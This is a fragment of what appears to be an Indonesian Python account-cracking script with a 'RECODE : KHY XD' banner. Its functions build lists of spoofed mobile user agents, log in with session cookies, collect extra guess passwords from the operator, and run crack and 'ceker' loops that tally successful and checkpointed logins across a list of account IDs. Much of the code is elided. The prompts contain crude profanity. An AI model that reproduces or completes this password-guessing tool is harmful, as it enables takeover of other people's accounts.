...
for xd in range(10000):
	...
	aa='Mozilla/5.0 (Linux; Android 8.0.0; FIG-LX3 Build/HUAWEIFIG-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'
	...
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
...
┃┃┃╰┫┃╱┃┃╱┃┃╱╱╭╯╭╮╰┳╯╰╯┃
╰╯╰━┻╯╱╰╯╱╰╯╱╱╰━╯╰━┻━━━╯
			{m}•{k}•{h}•{sir} RECODE : KHY XD {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies Kadaluarsa ngntd ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
...
#		method.append('touch')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] 123456,ngentod,sayang[white] '))
		pwku=input('>> Masukkan Password Tambahan y kntl : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r𖤐 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 11; V2120) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36:;]'
